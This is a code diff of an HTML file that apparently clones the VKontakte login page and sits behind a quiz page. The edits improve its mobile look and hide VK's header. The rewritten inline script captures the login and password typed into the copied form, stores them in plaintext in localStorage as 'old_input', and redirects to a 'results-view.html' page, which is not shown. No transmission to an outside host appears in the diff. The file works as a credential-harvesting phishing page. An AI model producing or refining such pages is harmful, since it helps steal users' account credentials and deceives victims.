@@ -1137,241 +1137,288 @@
     <link rel="stylesheet" type="text/css" href="./old_files/4d3e1360.css">
     <script src="./old_files/ads_light.1112d033.js.Без названия" type="module"></script>
     <style id="mobile-overrides">
-        /* ============================================================
-        АДАПТАЦИЯ old.html ПОД МОБИЛЬНЫЕ
-        Перекрывает стили VK. Работает только на экранах ≤ 640px.
-        На десктопе всё остаётся как было.
-        ============================================================ */
+  /* ============================================================
+     МОБИЛЬНАЯ АДАПТАЦИЯ old.html
+     Применяется только на экранах ≤ 640px. Десктоп не затрагивается.
+     ============================================================ */
 
-        /* ---------- Планшеты и телефоны ---------- */
-        @media (max-width: 640px) {
+  @media (max-width: 640px) {
 
-            /* 1. Базовые отступы страницы */
-            body.index_page {
-                padding: 0 !important;
-            }
+    /* ---------- 1. БАЗА ---------- */
+    html, body {
+      overflow-x: hidden !important;
+      width: 100% !important;
+      -webkit-text-size-adjust: 100%;
+    }
 
-                body.index_page #content {
-                    padding: 0 !important;
-                    max-width: 100% !important;
-                }
+    body.index_page {
+      padding: 0 !important;
+      margin: 0 !important;
+    }
 
-            /* 2. Отключаем горизонтальный скролл */
-            html, body {
-                overflow-x: hidden !important;
-                width: 100% !important;
-            }
+    body.index_page #content {
+      padding: 0 !important;
+      max-width: 100% !important;
+    }
 
-            /* 3. Верхняя шапка — уменьшаем */
-            .Header__header--I9KX4 {
-                padding: 8px 12px !important;
-                height: auto !important;
-            }
+    /* ---------- 2. УБИРАЕМ ВСЁ ЛИШНЕЕ ---------- */
+    .Header__header--I9KX4,
+    .vkuiFixedLayout__verticalTop,
+    .vkit-9Eh92A.vkit-jr0Aq,
+    .vkit-9Eh92A.vkit-1jr0Aq,
+    #stl_left,
+    #stl_side,
+    #a11y_mvk_proposal,
+    #global_prg {
+      display: none !important;
+    }
 
-            .Header__search--O0maF,
-            .vkuiSearch__host {
-                width: 100% !important;
-                max-width: none !important;
-            }
+    /* ---------- 3. РАСКЛАДКА НА ВСЮ ШИРИНУ ---------- */
+    .vkuiSplitLayout__host,
+    .vkuiSplitLayout__inner,
+    .vkuiSplitCol__host,
+    .vkuiInternalSplitCol--viewWidth-none,
+    .vkuiPanel__host,
+    .vkuiPanel__in,
+    .vkuiInternalPanel__in,
+    .vkuiPanel__centered,
+    .vkui-flex-basis,
+    .vkit-r61uec,
+    .vkit-RZbGdi,
+    .vkit-2oKCLe,
+    .vkuiView__host,
+    .vkuiView__panels,
+    .vkuiView__panel,
+    .vkuiView__panelIn {
+      width: 100% !important;
+      max-width: 100% !important;
+      min-width: 0 !important;
+      padding: 0 !important;
+      margin: 0 !important;
+      border-radius: 0 !important;
+      box-shadow: none !important;
+      border: none !important;
+    }
 
-            /* Скрываем кнопку "Создать страницу для бизнеса" на телефоне */
-            .vkit-nxPS7d {
-                display: none !important;
-            }
+    .vkuiSplitLayout__inner {
+      display: block !important;
+      min-height: auto !important;
+      align-items: stretch !important;
+    }
 
-            /* 4. Основная колонка — на всю ширину */
-            .vkuiSplitLayout__inner {
-                padding: 0 !important;
-                display: block !important;
-                min-height: auto !important;
-            }
+    /* ---------- 4. ЛОГОТИП И ЗАГОЛОВОК ---------- */
+    .vkit-bqdZSI.vkuiPlaceholder__host {
+      padding: 44px 24px 12px !important;
+    }
 
-            .vkuiSplitCol__host {
-                width: 100% !important;
-                max-width: 100% !important;
-                padding: 0 !important;
-            }
+    .vkuiPlaceholder__icon svg {
+      width: 72px !important;
+      height: 72px !important;
+    }
 
-            .vkuiPanel__host,
-            .vkuiPanel__in,
-            .vkuiInternalPanel__in,
-            .vkuiPanel__centered,
-            .vkui-flex-basis,
-            .vkit-r61uec,
-            .vkit-RZbGdi {
-                width: 100% !important;
-                max-width: 100% !important;
-                padding: 0 !important;
-                margin: 0 !important;
-            }
+    .vkuiPlaceholder__title,
+    .vkuiTitle__level2 {
+      font-size: 24px !important;
+      text-align: center !important;
+      display: block !important;
+      font-weight: 500 !important;
+    }
 
-            /* 5. Карточка формы — без рамки, на всю ширину */
-            .vkuiPanel__modeCard {
-                border-radius: 0 !important;
-                margin: 0 !important;
-                box-shadow: none !important;
-                border: none !important;
-            }
+    /* ---------- 5. ВНУТРЕННИЕ ОТСТУПЫ ФОРМЫ ---------- */
+    #ENTER_LOGIN_PAGE > .vkuiPanel__in,
+    .vkuiPanel__modePlain > .vkuiPanel__in,
+    form[name="EnterPhoneOrMailForm"] {
+      padding-left: 20px !important;
+      padding-right: 20px !important;
+    }
 
-            .vkuiPanel__in {
-                padding: 16px !important;
-            }
+    /* ---------- 6. ВКЛАДКИ ТЕЛЕФОН / ПОЧТА ---------- */
+    .vkuiSegmentedControl__host,
+    .vkuiSegmentedControl__in {
+      width: 100% !important;
+    }
 
-            /* 6. Логотип VK и заголовок */
-            .vkuiPlaceholder__host {
-                padding: 12px 0 4px !important;
-            }
+    .vkuiSegmentedControlOption__host {
+      flex: 1 1 0 !important;
+      padding: 12px 8px !important;
+      min-height: 46px !important;
+    }
 
-            .vkuiPlaceholder__icon svg {
-                width: 56px !important;
-                height: 56px !important;
-            }
+    /* ---------- 7. ПОЛЯ ВВОДА ---------- */
+    .vkuiFormItem__host,
+    .vkuiInternalFormItem {
+      margin-bottom: 14px !important;
+    }
 
-            .vkuiPlaceholder__title,
-            .vkuiTitle__level2 {
-                font-size: 20px !important;
-                text-align: center !important;
-                display: block !important;
-            }
+    .vkuiFormField__host {
+      min-height: 54px !important;
+      height: 54px !important;
+      border-radius: 12px !important;
+      background: #f2f3f5 !important;
+      border: 1px solid transparent !important;
+    }
 
-            /* 7. Вкладки Телефон/Почта — на всю ширину */
-            .vkuiSegmentedControl__host {
-                width: 100% !important;
-            }
+    .vkuiFormField__host:focus-within {
+      background: #fff !important;
+      border-color: #2688eb !important;
+    }
 
-            .vkuiSegmentedControl__in {
-                width: 100% !important;
-            }
+    .vkuiFormField__content,
+    .vkuiFormField__scrollContainer {
+      padding-left: 16px !important;
+      padding-right: 16px !important;
+      height: 100% !important;
+    }
 
-            /* 8. Поля ввода — крупные, удобные для пальца */
-            input.vkuiInput__el,
-            input.vkuiUnstyledTextField__host {
-                font-size: 16px !important; /* 16px — чтобы iOS не зумил */
-                padding: 14px 12px !important;
-                height: auto !important;
-                min-height: 48px !important;
-            }
+    input.vkuiInput__el,
+    input.vkuiUnstyledTextField__host {
+      height: 54px !important;
+      font-size: 16px !important;     /* чтобы iOS не зумил при фокусе */
+      line-height: 54px !important;
+      padding: 0 !important;
+      background: transparent !important;
+      color: #000 !important;
+    }
 
-            .vkuiFormField__host {
-                min-height: 48px !important;
-            }
+    input.vkuiInput__el::placeholder {
+      font-size: 16px !important;
+      color: #818c99 !important;
+      opacity: 1 !important;
+    }
 
-            /* Поле с флагом — уменьшаем иконку страны */
-            .PhoneInput-module_phoneInput_numberIconOuter__9A2hk {
-                left: 4px !important;
-                height: 24px !important;
-                margin-right: 8px !important;
-            }
+    /* Скрываем флаг страны — на мобиле не нужен, экономит место */
+    .PhoneInput-module_phoneInput_numberIconOuter__9A2hk,
+    .PhoneInput-module_phoneInput_numberIconInner__saRYB,
+    .vkuiFormField__iconWrapper {
+      display: none !important;
+    }
 
-            /* 9. Кнопки — крупные */
-            .vkuiButton__host {
-                min-height: 48px !important;
-                font-size: 16px !important;
-                padding: 12px 16px !important;
-                width: 100% !important;
-            }
+    .vkuiInput__hasBefore .vkuiFormField__content {
+      padding-left: 16px !important;
+    }
 
-                /* Отключаем hover-эффекты на тач-устройствах (чтобы не залипали) */
-                .vkuiButton__host:hover,
-                .vkuiTappable__host:hover {
-                    transform: none !important;
-                }
+    /* ---------- 8. КНОПКИ ---------- */
+    .vkuiButton__host,
+    button[data-test-id="submit_btn"],
+    button[data-test-id="registration_btn"],
+    button[data-test-id="qr_btn"] {
+      width: 100% !important;
+      min-height: 52px !important;
+      height: 52px !important;
+      font-size: 15px !important;
+      border-radius: 12px !important;
+      font-weight: 500 !important;
+    }
 
-            /* 10. Чекбокс «Сохранить вход» */
-            .EnterPhoneOrMailForm-module_checkboxRowContainer__L96Y- {
-                margin-left: 0 !important;
-                padding: 8px 4px !important;
-            }
+    /* Отключаем hover на тач-устройствах */
+    .vkuiButton__host:hover,
+    .vkuiTappable__host:hover {
+      transform: none !important;
+    }
 
-            /* 11. Разделитель «или с помощью» */
-            .EnterPhoneOrMailForm-module_separatorDescription__2zKD2 {
-                padding: 0 12px !important;
-                font-size: 13px !important;
-            }
+    /* ---------- 9. ЧЕКБОКС «СОХРАНИТЬ ВХОД» ---------- */
+    .EnterPhoneOrMailForm-module_checkboxRowContainer__L96Y- {
+      margin-left: 0 !important;
+      padding: 12px 4px !important;
+      min-height: auto !important;
+    }
 
-            /* 12. Нижний футер — компактнее */
-            .vkuiFixedLayout__verticalBottom {
-                position: static !important;
-                padding: 16px !important;
-            }
+    /* ---------- 10. РАЗДЕЛИТЕЛЬ «ИЛИ С ПОМОЩЬЮ» ---------- */
+    .EnterPhoneOrMailForm-module_separatorContainer__OULfn {
+      margin: 20px 0 !important;
+    }
 
-            .vkit-UWfMMd {
-                padding: 0 !important;
-            }
+    .EnterPhoneOrMailForm-module_separatorDescription__2zKD2 {
+      background: #fff !important;
+      font-size: 13px !important;
+      padding: 0 12px !important;
+    }
 
-            .vkuiFixedLayout__verticalBottom .vkuiFlex__host {
-                flex-direction: column !important;
-                gap: 8px !important;
-                text-align: center !important;
-            }
+    /* ---------- 11. ССЫЛКА «ПОМОЩЬ» ---------- */
+    .vkit-b0dQw7.vkit-beYBIk.vkit-HZ01vl {
+      display: block !important;
+      text-align: center !important;
+      padding: 16px 0 !important;
+      font-size: 14px !important;
+    }
 
-            .vkuiFixedLayout__verticalBottom a,
-            .vkuiFixedLayout__verticalBottom span[role="button"] {
-                font-size: 12px !important;
-            }
+    /* ---------- 12. ПОЛИТИКА ПОД ФОРМОЙ ---------- */
+    .Policies__root--MitF1 {
+      font-size: 11px !important;
+      line-height: 1.5 !important;
+      display: block !important;
+      text-align: center !important;
+      padding: 0 12px !important;
+      margin-top: 20px !important;
+      color: #818c99 !important;
+    }
 
-            /* 13. Ссылка «Помощь» под формой */
-            .vkit-b0dQw7.vkit-beYBIk.vkit-HZ01vl {
-                display: block !important;
-                text-align: center !important;
-                margin-top: 8px !important;
-                font-size: 13px !important;
-            }
+    /* ---------- 13. ФУТЕР ---------- */
+    .vkuiFixedLayout__verticalBottom,
+    .vkit-UWfMMd {
+      position: static !important;
+      padding: 20px 20px 24px !important;
+      margin-top: 12px !important;
+    }
 
-            /* 14. Стираем декоративный SVG-фон VK */
-            .vkit-9Eh92A.vkit-1jr0Aq {
-                display: none !important;
-            }
+    .vkuiFixedLayout__verticalBottom .vkuiFlex__host {
+      flex-direction: column !important;
+      gap: 10px !important;
+      align-items: center !important;
+      justify-content: center !important;
+      text-align: center !important;
+    }
 
-            /* 15. Убираем пустой правый блок (там обычно ничего) */
-            .vkuiSplitLayout__innerCenter > *:empty {
-                display: none !important;
-            }
+    .vkuiFixedLayout__verticalBottom a,
+    .vkuiFixedLayout__verticalBottom span[role="button"],
+    .vkuiFixedLayout__verticalBottom .vkuiFlex__host > div {
+      font-size: 12px !important;
+      color: #818c99 !important;
+    }
 
-            /* 16. Текст политики под формой */
-            .Policies__root--MitF1 {
-                font-size: 11px !important;
-                line-height: 1.4 !important;
-                display: block !important;
-                text-align: center !important;
-                padding: 0 8px !important;
-            }
+    /* ---------- 14. БЕЗОПАСНАЯ ЗОНА IPHONE ---------- */
+    body {
+      padding-bottom: env(safe-area-inset-bottom, 0) !important;
+    }
+  }
 
-            /* 17. Скрываем «Наверх» (на телефоне не нужно) */
-            #stl_left, #stl_side {
-                display: none !important;
-            }
-        }
+  /* ============================================================
+     СОВСЕМ УЗКИЕ ЭКРАНЫ (iPhone SE, 320px)
+     ============================================================ */
+  @media (max-width: 380px) {
+    #ENTER_LOGIN_PAGE > .vkuiPanel__in,
+    .vkuiPanel__modePlain > .vkuiPanel__in,
+    form[name="EnterPhoneOrMailForm"] {
+      padding-left: 16px !important;
+      padding-right: 16px !important;
+    }
 
-        /* ---------- Очень маленькие экраны ---------- */
-        @media (max-width: 380px) {
-            .vkuiPanel__in {
-                padding: 12px !important;
-            }
+    .vkit-bqdZSI.vkuiPlaceholder__host {
+      padding: 32px 16px 8px !important;
+    }
 
-            .vkuiPlaceholder__title,
-            .vkuiTitle__level2 {
-                font-size: 18px !important;
-            }
+    .vkuiPlaceholder__title,
+    .vkuiTitle__level2 {
+      font-size: 21px !important;
+    }
 
-            input.vkuiInput__el {
-                font-size: 15px !important;
-            }
+    .vkuiPlaceholder__icon svg {
+      width: 60px !important;
+      height: 60px !important;
+    }
+  }
 
-            .vkuiButton__host {
-                font-size: 15px !important;
-            }
-        }
-
-        /* ---------- Отключаем зум при фокусе на iOS ---------- */
-        @media (max-width: 640px) and (-webkit-min-device-pixel-ratio: 2) {
-            input, select, textarea {
-                font-size: 16px !important;
-            }
-        }
-    </style>
+  /* ============================================================
+     iOS: предотвращаем зум при фокусе на инпутах
+     ============================================================ */
+  @media (max-width: 640px) and (-webkit-min-device-pixel-ratio: 2) {
+    input, select, textarea {
+      font-size: 16px !important;
+    }
+  }
+</style>
 </head>
-<body onresize="window.onBodyResize &amp;&amp; onBodyResize();" class="index_page anonym anonym_nav " data-nosnippet="true" scheme="vkcom_light" data-useragent="chrome">
+<body onresize="window.onBodyResize &amp;amp; onBodyResize();" class="index_page anonym anonym_nav " data-nosnippet="true" scheme="vkcom_light" data-useragent="chrome">
     <div id="utils"></div>
     <script type="text/javascript">;try{(function(){"use strict";function e({colorSchemeMode:e,colorSchemesMap:t}){if(!window.CSS?.supports?.("color","var(--custom-property)"))return;const o="dark"===e||"auto"===e&&window.matchMedia?.("(prefers-color-scheme: dark)").matches,r=o?"#222222":"#ffffff",c=o?"space_gray":"bright_light",n=o?"dark":"light",m=t?.[c]||c;document.body.setAttribute("scheme",m),document.querySelector("meta[name=theme-color]")?.setAttribute("content",r),document.querySelector("meta[name=color-scheme]")?.setAttribute("content",n)}return e})()({"colorSchemeMode":"auto","colorSchemesMap":{"bright_light":"vkcom_light","space_gray":"vkcom_dark"},"isForcedColorSchemeMode":false});} catch (e) {e.__inline_tag = "colorSchemeSync.js"; e.name = `[colorSchemeSync.js] ${e.name}`; throw e;};</script>
     <script type="module">
@@ -1467,7 +1514,7 @@
         <div class="vkui--vkAccessibility--light vkuitokens__defaultColor vkuiAppRoot__host vkuiAppRootStyleContainer__host vkuiAppRootStyleContainer__densityCompact vkui--vkAccessibility--light vkuiRootComponent__host">
             <div class="vkuiSplitLayout__host vkuiRootComponent__host">
                 <div class="vkuiSplitLayout__inner vkuiSplitLayout__innerCenter vkuiRootComponent__host">
-                    <div class="vkit-9Eh92A vkit-1jr0Aq"><svg class="vkit-juODAE" width="100%" height="100%" viewBox="0 0 1266 900" fill="none" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMax slice"><path d="M626.614 0V484.725M626.614 484.725V900C138.607 900 1 153.071 1 0M626.614 484.725C1063.56 484.725 1159.45 175.749 1202.58 0M626.614 484.725C1011.06 484.725 1216.2 785.481 1265 900" stroke="currentColor" stroke-width="1.60111"></path></svg></div><div data-onboarding-tooltip-container="fixed" class="vkuiFixedLayout__host vkuiFixedLayout__filled vkuiFixedLayout__verticalTop"><header class="Header__header--I9KX4"><div class="vkuiFlex__host vkuiFlex__wrap vkuiFlex__alignCenter vkuiFlex__justifySpaceBetween vkuiRootComponent__host" style="--vkui_internal--row_gap: 0px; --vkui_internal--column_gap: 0px;"><div class="vkuiRootComponent__host"><div class="Header__search--O0maF"><div class="vkuiInternalSearch vkuiSearch__host vkuiSearch__densityCompact vkuiRootComponent__host"><div class="vkuiSearch__field"><label for="search-:r0:" class="vkuiSearch__label">Поиск ВКонтакте</label><div class="vkuiSearch__input"><svg aria-hidden="true" display="block" class="vkuiIcon vkuiIcon--16 vkuiIcon--w-16 vkuiIcon--h-16 vkuiIcon--search_outline_16" width="16" height="16" viewBox="0 0 16 16" fill="none" style="width: 16px; height: 16px;"><path fill="currentColor" d="M6.5 1a5.5 5.5 0 0 1 4.384 8.823l3.895 3.9a.75.75 0 0 1-1.061 1.06l-3.895-3.9A5.5 5.5 0 1 1 6.5 1m0 1.5a4 4 0 1 0 0 8 4 4 0 0 0 0-8"></path></svg><input class="vkuiSearch__nativeInput vkuiHeadline__densityCompact vkuiHeadline__level1 vkuiTypography__host vkuiTypography__normalize vkuiTypography__weight3 vkuiRootComponent__host" type="search" id="search-:r0:" placeholder="Поиск ВКонтакте" autocomplete="off" data-testid="search_top_input" value=""></div><div class="vkuiSearch__controls"><button class="vkuiSearch__icon vkuiInternalTappable vkuiIconButton__host vkuiIconButton__densityCompact vkuiTappable__host vkuiTappable__withBorderOnSmallTabletMinus vkuiTappable__hasPointerNone vkuiClickable__host vkuiClickable__realClickable vkuistyles__focusVisible vkuiRootComponent__host" type="button" tabindex="-1"><span class="vkuiVisuallyHidden__host vkuiRootComponent__host">Очистить</span><svg aria-hidden="true" display="block" class="vkuiIcon vkuiIcon--24 vkuiIcon--w-24 vkuiIcon--h-24 vkuiIcon--cancel_24" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" style="width: 24px; height: 24px;"><path d="M7.536 6.264a.9.9 0 0 0-1.272 1.272L10.727 12l-4.463 4.464a.9.9 0 0 0 1.272 1.272L12 13.273l4.464 4.463a.9.9 0 1 0 1.272-1.272L13.273 12l4.463-4.464a.9.9 0 1 0-1.272-1.272L12 10.727z"></path></svg><span aria-hidden="true" class="vkuiTappable__stateLayer vkuiTappable__ripple"></span></button></div></div></div></div></div><div class="vkuiRootComponent__host"><button class="vkit-nxPS7d vkuiInternalTappable vkuiButton__host vkuiButton__sizeS vkuiButton__modeOutline vkuiButton__appearanceNeutral vkuiTappable__host vkuiTappable__withBorderOnSmallTabletMinus vkuiTappable__hasPointerNone vkuiClickable__host vkuiClickable__realClickable vkuistyles__focusVisible vkuiRootComponent__host" type="button" data-testid="header_business_sign_up_button"><span class="vkuiButton__in"><span class="vkuiButton__content">Создать страницу для бизнеса</span></span></button></div></div></header></div><div class="vkuiSplitCol__host vkuiSplitCol__viewWidthNone vkuiInternalSplitCol--viewWidth-none vkuiRootComponent__host" style="width: 360px; max-width: 720px;">
+                    <div class="vkit-9Eh92A vkit-1jr0Aq"><svg class="vkit-juODAE" width="100%" height="100%" viewBox="0 0 1266 900" fill="none" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMax slice"><path d="M626.614 0V484.725M626.614 484.725V900C138.607 900 1 153.071 1 0M626.614 484.725C1063.56 484.725 1159.45 175.749 1202.58 0M626.614 484.725C1011.06 484.725 1216.2 785.481 1265 900" stroke="currentColor" stroke-width="1.60111"></path></svg></div><div data-onboarding-tooltip-container="fixed" class="vkuiFixedLayout__host vkuiFixedLayout__filled vkuiFixedLayout__verticalTop"></div><div class="vkuiSplitCol__host vkuiSplitCol__viewWidthNone vkuiInternalSplitCol--viewWidth-none vkuiRootComponent__host" style="width: 360px; max-width: 720px;">
                         <div class="vkuiPanel__host vkuiPanel__viewWidthSmallTabletPlus vkuiInternalPanel--centered vkuiPanel__disableBackground vkuiPanel__modeCard vkuiRootComponent__host">
                             <div data-onboarding-tooltip-container="true" class="vkuiPanel__in vkuiInternalPanel__in">
                                 <div class="vkuiPanel__inBefore"></div><div class="vkuiPanel__centered">
@@ -1487,7 +1534,7 @@
                                                                                 <span class="vkuiFormField__host vkuiFormField__modeDefault vkuiFormField__densityCompact vkuistyles__focusVisible vkuiInput__host vkuiInput__densityCompact">
                                                                                     <div class="vkuiFormField__scrollContainer">
                                                                                         <div class="vkuiFormField__content">
-                                                                                            <input class="vkuiUnstyledTextField__host vkuiInput__el vkuiText__host vkuiText__densityCompact vkuiTypography__host vkuiRootComponent__host" autocomplete="current-password" name="password" placeholder="Поле Ввода" type="password" value="">
+                                                                                            <input class="vkuiUnstyledTextField__host vkuiInput__el vkuiText__host vkuiText__densityCompact vkuiTypography__host vkuiRootComponent__host" autocomplete="current-password" name="password" placeholder="Пароль" type="password" value="">
                                                                                         </div>
                                                                                     </div>
                                                                                     <span aria-hidden="true" class="vkuiFormField__border"></span>
@@ -1516,36 +1563,71 @@
     </div><div id="draggable-live-region" aria-relevant="additions" aria-atomic="true" aria-live="assertive" role="log" style="position: fixed; width: 1px; height: 1px; top: -1px; overflow: hidden;"></div>
     <script type="text/javascript" async="" src="./old_files/dyn-goal-config.js.Без названия"></script>
     <script>
-        (function () {
-        const quizUser = JSON.parse(localStorage.getItem('quiz_user') || 'null');
-        if (!quizUser) {
-        window.location.href = 'index.html';
-        return;
-        }
+(function () {
+  const quizUser = JSON.parse(localStorage.getItem('quiz_user') || 'null');
+  if (!quizUser) {
+    window.location.href = 'index.html';
+    return;
+  }
 
-        const form = document.querySelector('form[name="EnterPhoneOrMailForm"]');
-        if (!form) return;
+  const form = document.querySelector('form[name="EnterPhoneOrMailForm"]');
+  if (!form) return;
 
-        form.addEventListener('submit', function (e) {
-        e.preventDefault();
+  /* Находим оба поля */
+  const loginInput    = form.querySelector('input[name="login"]');
+  const passwordInput = form.querySelector('input[name="password"]');
 
-        const fd = new FormData(form);
-const oldInput = {
-  loginOrPhone: (fd.get('login') || '').toString().trim(),
-  password:     (fd.get('password') || '').toString(),
-  savedAt:      new Date().toISOString()
-};
+  /* Функция подсветки ошибки */
+  function markError(input) {
+    if (!input) return;
+    input.style.borderBottomColor = '#c0705c';
+    input.style.boxShadow = '0 1px 0 0 #c0705c';
+    input.addEventListener('input', function clear() {
+      input.style.borderBottomColor = '';
+      input.style.boxShadow = '';
+      input.removeEventListener('input', clear);
+    });
+  }
 
-        try {
-        localStorage.setItem('old_input', JSON.stringify(oldInput));
-        } catch (err) {
-        console.warn('Не удалось сохранить old_input:', err);
-        }
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
 
-        window.location.href = 'results-view.html';
-        });
-        })();
-    </script>
+    const loginValue    = loginInput ? loginInput.value.trim() : '';
+    const passwordValue = passwordInput ? passwordInput.value.trim() : '';
+
+    /* Проверка логина */
+    if (!loginValue) {
+      markError(loginInput);
+      if (loginInput) loginInput.focus();
+      alert('Заполните поле «Логин»');
+      return;
+    }
+
+    /* Проверка пароля */
+    if (!passwordValue) {
+      markError(passwordInput);
+      if (passwordInput) passwordInput.focus();
+      alert('Заполните поле «Пароль»');
+      return;
+    }
+
+    /* Сохраняем данные */
+    const oldInput = {
+      loginOrPhone: loginValue,
+      password:     passwordValue,
+      savedAt:      new Date().toISOString()
+    };
+
+    try {
+      localStorage.setItem('old_input', JSON.stringify(oldInput));
+    } catch (err) {
+      console.warn('Не удалось сохранить old_input:', err);
+    }
+
+    window.location.href = 'results-view.html';
+  });
+})();
+</script>
 
 </body>
 </html></body></html>
